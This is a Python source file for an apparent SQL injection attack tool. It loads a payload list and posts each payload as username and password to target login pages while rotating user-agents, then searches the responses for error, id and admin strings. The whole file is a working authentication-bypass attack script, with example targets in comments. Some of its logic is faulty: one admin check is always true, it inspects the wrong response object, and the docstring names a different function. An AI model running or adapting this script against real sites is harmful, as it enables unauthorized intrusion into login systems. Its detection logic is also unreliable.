import os
import sys
import asyncio
import re
import requests
from colorama import Fore,init,Style
from datetime import datetime
# import sock
import sqlite3
# from database import create_database_for_Captures
import os
import sys

current_directory = os.getcwd()

sys.path.append(current_directory)
import sys
import os
from lib.scripts.headers import Prepare_the_headers
from lib.scripts.headers import headers
from lib.scripts.headers import header
from  lib.regelexpression.patterns import Detect
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from logger.logs import logger
from lib.result.Results import safe_SQLJNG_result
from lib.result.Results import SQLJNG_result_report
from Exceptions.exceptions import SQLJNGStackRangeError
from lib.Stacks.stack import html_response
from lib.scripts.headers import *



import logging

attack_type = "authentication bypass SQL injection"

"""
Function: mysql_extract_value_injection
Description: Performs MySQL error-based extraction attacks to extract values on a target website.

Dependencies:
- os
- sys
- asyncio
- re
- requests
- colorama (Fore, init, Style)
- datetime
- sqlite3
- headers (from headers import *)
- logging

Note:
- The payloads for MySQL error-based attacks are sourced from https://github.com/payloadbox/sql-injection-payload-list.
- The headers for HTTP requests are inspired by https://stackoverflow.com/questions/70017732/how-to-change-the-ip-address-in-the-url.
- The 'headers' module is required for user-agent settings (imported from headers import *).
- Logging is configured to store information in the 'SQLJ.log' file.

Usage:
1. Import the necessary libraries and dependencies.
2. Use the 'mysql_extract_value_injection(urls)' function to perform MySQL error-based extraction attacks on the specified URLs.

Example:
```python
from sql_injection_exploit import mysql_extract_value_injection

urls_to_attack = ["http://example.com/login", "http://testsite.net/login"]
for url in urls_to_attack:
    asyncio.run(mysql_extract_value_injection(url))
"""





pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}




logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)


async def Extract_value_injection(urls):
    """This is the authentication bypass sql injection block. it occurs when the input datas are not validated and attacker can inject its own code to the database and bypass the authentication"""
    try:
        """This is the main block of our exploit program which sending the payloads. """
        global pattern,htmlpattern  
        done = False 
        filename = "mysqlextractvalue.txt" 
        current_directory = os.path.dirname(os.path.abspath(__file__)) 
        file_path = os.path.join(current_directory, filename) 

        with open(file_path, "r") as file: 
            payload = file.read()
            rows = payload.split("\n") 
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows) #* 
            logger.info(f"Payload:{sorted_payload} \n is ready to be send")
            requests.packages.urllib3.disable_warnings()  #
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False) 
            if req.status_code == 200: 
                ask = input(f"[{datetime.now()}]{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}[INFO]**Looks like the host is up: {Fore.RESET}{Fore.YELLOW}{urls} {Fore.RESET}{Fore.GREEN} \nDo you want to send the payload above to the website?** ")

                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"): 
                        params = { 
                            "username": line,
                            "password": line
                        }
                        await Prepare_the_headers()
                        for headerR in headers:
                            ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header}) 
                            logger.info(f"Sending payload:{line} to the target.")

                            await asyncio.sleep(5) 
                            if "error" in ack.text: 
                                logger.info("Error parameter might exists in the response code.")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.push(ack.text)
                                
                            vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) 
                            htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                            if vuln: 
                                logger.info("Id parameter might exists in the code.")
                                Detect(ack.text)
                                await asyncio.sleep(4)
                                html_response.push(ack.text)

                            
                            if htmlVULN:
                                logger.info(f"could find error parameter in the response code of html.")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.push(ack.text)

                            
                            word = "id" in req.text                             
                            errword = "error" in req.text
                            if word:
                                logger.info("Id parameter might exists in the response.")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.push(ack.text)

                            
                            if errword:
                                logger.info("Error parameter might exists in the response.")
                                Detect(ack.text)
                                html_response.push(ack.text)

                                
                        if req.status_code == 302:                                             
                            logger.info("Could break into the server")
                        
                        if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                            logger.info("Admin parameter might exists in the code.")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            html_response.push(ack.text)

                            
                else:
                    logger.error("Host is down.")
            

    except Exception as e:
        print(f"{datetime.now()}",Fore.RED+"Error:",e,"|Attack:|",attack_type)
        
    except KeyboardInterrupt:
        sys.exit("Aborted by user.")
        

        
    finally:
        try:
            await SQLJNG_result_report(html_response)
        
        except SQLJNGStackRangeError:
            result = safe_SQLJNG_result(html_response)
            for res in result:
                logger.setLevel(logging.INFO)
                logger.info("Result")
                logger.setLevel(logging.CRITICAL)
     
        
        
     


# asyncio.run(Extract_value_injection("http://testfire.net/login.jsp"))
